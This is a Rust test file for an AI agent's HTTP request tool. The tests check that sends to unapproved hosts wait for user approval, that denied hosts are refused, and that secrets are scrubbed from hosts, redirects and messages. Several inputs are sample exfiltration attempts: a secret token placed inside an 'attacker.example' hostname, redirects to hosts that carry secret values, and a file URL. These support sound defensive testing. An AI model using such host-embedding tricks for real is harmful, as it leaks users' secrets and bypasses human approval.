//! Refused sends over the wire: untrusted hosts refused unresolved with an approval filed once,
//! denied hosts and secrets in a host refused with no filing, redirect hops judged too, and a
//! variable named inside a secret withheld. No test reaches a non-local host.

use crate::common;

use common::{ROOT, TestServer};
use serde_json::json;
use wiremock::matchers::method;
use wiremock::{Mock, MockServer, ResponseTemplate};

const DEV: &str = "name: dev\nvariables:\n  - name: token\n    secret: true\n";

fn get(url: &str) -> String {
    format!("info:\n  name: r\n  type: http\nhttp:\n  method: GET\n  url: \"{url}\"\n")
}

async fn start(url: &str) -> TestServer {
    TestServer::start(&[
        ("opencollection.yml", ROOT),
        ("environments/dev.yml", DEV),
        ("r.yml", &get(url)),
    ])
    .await
}

#[tokio::test]
async fn an_untrusted_host_files_one_approval_and_asks_the_agent_to_retry() {
    let server = start("https://API.Example.com./users").await;
    let message = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(message.contains("`api.example.com`"), "{message}");
    assert!(
        message.contains("retry after the user approves"),
        "{message}"
    );
    let pending = server.inbox().pending().expect("inbox");
    assert_eq!(pending.len(), 1, "{pending:?}");
    assert_eq!(pending[0].host, "api.example.com");
    assert_eq!(pending[0].request, "r.yml");
    assert_eq!(
        pending[0].collection,
        std::fs::canonicalize(server.root()).expect("canonical")
    );
    // A retry before the user decides reports the same and files nothing new.
    let again = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(again.contains("retry after the user approves"), "{again}");
    assert_eq!(server.inbox().pending().expect("inbox").len(), 1);
}

#[tokio::test]
async fn a_denied_host_is_refused_without_an_approval() {
    let server = start("https://evil.example/").await;
    server.deny("evil.example");
    let message = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(message.contains("denied"), "{message}");
    assert!(server.inbox().pending().expect("inbox").is_empty());
}

#[tokio::test]
async fn a_secret_in_the_host_shows_the_template_and_files_nothing() {
    let server = start("https://{{token}}.attacker.example/").await;
    server.set_secret("dev", "token", "Mixed9Case");
    let result = server
        .call(
            "send_request",
            json!({"path": "r.yml", "environment": "dev"}),
        )
        .await;
    assert_eq!(result.is_error, Some(true));
    let message = common::text(&result);
    assert!(message.contains("{{token}}.attacker.example"), "{message}");
    assert!(
        message.contains("non-secret environment variable"),
        "{message}"
    );
    assert!(message.contains("however short"), "{message}");
    let shown = serde_json::to_string(&result)
        .expect("serialises")
        .to_lowercase();
    assert!(!shown.contains("mixed9case"), "{shown}");
    assert!(server.inbox().pending().expect("inbox").is_empty());
}

#[tokio::test]
async fn a_redirect_to_an_untrusted_host_is_refused_at_its_hop() {
    let mock = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(
            ResponseTemplate::new(302).insert_header("location", "http://api.example.com/next"),
        )
        .mount(&mock)
        .await;
    let server = start(&format!("{}/start", mock.uri())).await;
    let message = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(message.contains("`api.example.com` (hop 1)"), "{message}");
    assert_eq!(server.inbox().pending().expect("inbox").len(), 1);
    assert_eq!(mock.received_requests().await.expect("recorded").len(), 1);
}

#[tokio::test]
async fn a_redirect_to_an_unapproved_local_listener_by_another_name_is_never_dialled() {
    // 0.0.0.0 is non-local to the policy yet dials the second local listener, so zero
    // requests there proves the hop was refused before any connection.
    let target = MockServer::start().await;
    let port = common::port_of(&target.uri());
    let mock = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(
            ResponseTemplate::new(302).insert_header("location", format!("http://0.0.0.0:{port}/")),
        )
        .mount(&mock)
        .await;
    let server = start(&format!("{}/start", mock.uri())).await;
    let message = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(message.contains("`0.0.0.0` (hop 1)"), "{message}");
    assert!(
        target
            .received_requests()
            .await
            .expect("recorded")
            .is_empty()
    );
}

#[tokio::test]
async fn a_url_without_a_host_is_refused_without_an_approval() {
    let server = start("file:///etc/hostname").await;
    let message = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(message.contains("names no host"), "{message}");
    assert!(server.inbox().pending().expect("inbox").is_empty());
}

#[tokio::test]
async fn a_redirect_host_holding_a_sensitive_value_is_scrubbed_and_not_filed() {
    let mock = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(
            ResponseTemplate::new(302).insert_header("location", "http://leakyhost9.example/"),
        )
        .mount(&mock)
        .await;
    let request = format!(
        "{}  headers:\n    - name: X-Key\n      value: \"{{{{key}}}}\"\n",
        get(&mock.uri())
    );
    let server =
        TestServer::start_with(&[("opencollection.yml", ROOT), ("r.yml", &request)], |o| {
            o.env_var("key", "leakyhost9")
        })
        .await;
    let message = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(message.contains("`<secret>.example`"), "{message}");
    assert!(!message.contains("leakyhost9"), "{message}");
    assert!(server.inbox().pending().expect("inbox").is_empty());
}

#[tokio::test]
async fn a_variable_written_inside_a_secret_is_not_named() {
    let headers = "  headers:\n    - name: X-Key\n      value: \"{{token}}\"\n";
    let request = format!("{}{headers}", get("http://127.0.0.1:9/"));
    let server = TestServer::start(&[
        ("opencollection.yml", ROOT),
        ("environments/dev.yml", DEV),
        ("r.yml", &request),
    ])
    .await;
    server.set_secret("dev", "token", "pre{{hiddenpart}}post");
    let message = server
        .err(
            "send_request",
            json!({"path": "r.yml", "environment": "dev"}),
        )
        .await;
    assert!(!message.contains("hiddenpart"), "{message}");
    assert!(message.contains("inside a secret value"), "{message}");
}

#[tokio::test]
async fn a_secret_host_header_is_refused_and_scrubbed() {
    let headers = "  headers:\n    - name: Host\n      value: \"{{token}}\"\n";
    let request = format!("{}{headers}", get("http://127.0.0.1:9/"));
    let server = TestServer::start(&[
        ("opencollection.yml", ROOT),
        ("environments/dev.yml", DEV),
        ("r.yml", &request),
    ])
    .await;
    server.set_secret("dev", "token", "Fronted-Host-7");
    let result = server
        .call(
            "send_request",
            json!({"path": "r.yml", "environment": "dev"}),
        )
        .await;
    assert_eq!(result.is_error, Some(true));
    let shown = serde_json::to_string(&result).expect("serialises");
    assert!(shown.contains("Host header `<secret>`"), "{shown}");
    assert!(!shown.contains("Fronted-Host-7"), "{shown}");
}

#[tokio::test]
async fn an_assertion_does_not_name_a_variable_written_inside_a_secret() {
    let mock = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(200).set_body_string("ok"))
        .mount(&mock)
        .await;
    let assertions = "runtime:\n  assertions:\n    - expression: res.status\n      operator: eq\n      value: \"{{token}}\"\n";
    let request = format!("{}{assertions}", get(&mock.uri()));
    let server = TestServer::start(&[
        ("opencollection.yml", ROOT),
        ("environments/dev.yml", DEV),
        ("r.yml", &request),
    ])
    .await;
    server.set_secret("dev", "token", "pre{{hiddenpart}}post");
    let result = server
        .ok(
            "send_request",
            json!({"path": "r.yml", "environment": "dev"}),
        )
        .await;
    let assertion = &result["assertions"][0];
    assert_eq!(assertion["verdict"], "fail", "{assertion}");
    let message = assertion["message"].as_str().expect("a message");
    assert!(!message.contains("hiddenpart"), "{message}");
    assert!(message.contains("inside a secret value"), "{message}");
}

/// Start on a request whose first hop, a local mock, redirects to `location`, with the
/// `--env-var` `key` set to `secret` and sent in a header so it joins the sensitive set.
async fn redirected(location: &str, secret: &str) -> (MockServer, TestServer) {
    let mock = MockServer::start().await;
    Mock::given(method("GET"))
        .respond_with(ResponseTemplate::new(302).insert_header("location", location))
        .mount(&mock)
        .await;
    let request = format!(
        "{}  headers:\n    - name: X-Key\n      value: \"{{{{key}}}}\"\n",
        get(&mock.uri())
    );
    let secret = secret.to_owned();
    let server =
        TestServer::start_with(&[("opencollection.yml", ROOT), ("r.yml", &request)], |o| {
            o.env_var("key", &secret)
        })
        .await;
    (mock, server)
}

#[tokio::test]
async fn a_redirect_host_holding_a_secret_in_another_case_is_not_filed() {
    let (_mock, server) = redirected("http://LeakyHost9.example/", "LeakyHost9").await;
    let message = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(message.contains("holds a secret"), "{message}");
    assert!(!message.to_lowercase().contains("leakyhost9"), "{message}");
    assert!(server.inbox().pending().expect("inbox").is_empty());
}

#[tokio::test]
async fn a_redirect_host_holding_a_punycoded_secret_is_not_filed() {
    // The secret is part of a label, so its punycode is not a substring of the host's.
    let host = url::Url::parse("http://Geheimnüs9-api.example/").expect("url");
    let ascii = host.host_str().expect("host").to_owned();
    assert!(ascii.starts_with("xn--"), "{ascii}");
    let (_mock, server) = redirected(&format!("http://{ascii}/"), "Geheimnüs9").await;
    let message = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(message.contains("holds a secret"), "{message}");
    let lower = message.to_lowercase();
    assert!(!lower.contains("geheimnüs9"), "{message}");
    assert!(!lower.contains(&ascii), "{message}");
    assert!(server.inbox().pending().expect("inbox").is_empty());
}

/// A local mock whose `/start` redirects to `location`, with `PORT` replaced by the mock's own
/// port, and whose `/x` answers 200.
async fn hop_to(location: &str) -> MockServer {
    use wiremock::matchers::path;
    let mock = MockServer::start().await;
    let location = location.replace("PORT", &mock.address().port().to_string());
    Mock::given(path("/start"))
        .respond_with(ResponseTemplate::new(302).insert_header("location", location.as_str()))
        .mount(&mock)
        .await;
    Mock::given(path("/x"))
        .respond_with(ResponseTemplate::new(200).set_body_string("ok"))
        .mount(&mock)
        .await;
    mock
}

async fn with_key(url: &str, secret: &str) -> TestServer {
    let request = format!(
        "{}  headers:\n    - name: X-Key\n      value: \"{{{{key}}}}\"\n",
        get(url)
    );
    let secret = secret.to_owned();
    TestServer::start_with(&[("opencollection.yml", ROOT), ("r.yml", &request)], |o| {
        o.env_var("key", &secret)
    })
    .await
}

#[tokio::test]
async fn a_local_redirect_host_holding_a_secret_in_another_case_is_scrubbed_from_the_result() {
    let mock = hop_to("http://LeakyHost9.localhost:PORT/x").await;
    let server = with_key(&format!("{}/start", mock.uri()), "LeakyHost9").await;
    let result = server.call("send_request", json!({"path": "r.yml"})).await;
    let shown = serde_json::to_string(&result).expect("serialises");
    assert_ne!(result.is_error, Some(true), "{shown}");
    assert!(shown.contains("<secret>.localhost"), "{shown}");
    assert!(!shown.to_lowercase().contains("leakyhost9"), "{shown}");
}

#[tokio::test]
async fn a_refused_connection_to_a_secret_local_host_is_scrubbed_in_any_case() {
    let mock = hop_to("http://LeakyHost9.localhost:1/x").await;
    let server = with_key(&format!("{}/start", mock.uri()), "LeakyHost9").await;
    let result = server.call("send_request", json!({"path": "r.yml"})).await;
    let shown = serde_json::to_string(&result).expect("serialises");
    assert_eq!(result.is_error, Some(true), "{shown}");
    assert!(shown.contains("Connection refused"), "{shown}");
    assert!(!shown.to_lowercase().contains("leakyhost9"), "{shown}");
}

#[tokio::test]
async fn a_local_redirect_host_with_a_secret_inside_a_punycoded_label_is_scrubbed() {
    let host = url::Url::parse("http://xGeheimnüs9y.localhost/").expect("url");
    let ascii = host.host_str().expect("host").to_owned();
    let label = ascii.split('.').next().expect("label").to_owned();
    let mock = hop_to(&format!("http://{ascii}:PORT/x")).await;
    let server = with_key(&format!("{}/start", mock.uri()), "Geheimnüs9").await;
    let result = server.call("send_request", json!({"path": "r.yml"})).await;
    let shown = serde_json::to_string(&result).expect("serialises");
    assert_ne!(result.is_error, Some(true), "{shown}");
    assert!(shown.contains("<secret>.localhost"), "{shown}");
    let lower = shown.to_lowercase();
    for leak in [label.as_str(), "geheimnüs9", "geheimns9"] {
        assert!(!lower.contains(leak), "{leak} in {shown}");
    }
}

#[tokio::test]
async fn a_redirect_host_holding_a_dotted_secret_is_not_filed() {
    let (_mock, server) = redirected("http://my.secret9.example/", "my.Secret9").await;
    let message = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(message.contains("holds a secret"), "{message}");
    assert!(!message.to_lowercase().contains("my.secret9"), "{message}");
    assert!(server.inbox().pending().expect("inbox").is_empty());
}

#[tokio::test]
async fn after_a_dismiss_the_agent_is_told_it_may_ask_again() {
    let server = start("https://api.example.com/users").await;
    let first = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(!first.contains("dismissed"), "{first}");
    let waiting = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(!waiting.contains("dismissed"), "still pending: {waiting}");

    // The app's Escape removes the inbox file and records nothing.
    let removed = server
        .inbox()
        .resolve(server.root(), "api.example.com")
        .expect("inbox");
    assert_eq!(removed, 1);

    let again = server.err("send_request", json!({"path": "r.yml"})).await;
    assert!(again.contains("dismissed"), "{again}");
    assert!(again.contains("may ask again"), "{again}");
    assert!(again.contains("retry after the user approves"), "{again}");
    assert!(again.contains("nothing was sent"), "{again}");
    assert!(!again.contains("denied"), "{again}");
    assert_eq!(
        server.inbox().pending().expect("inbox").len(),
        1,
        "re-filed"
    );
}
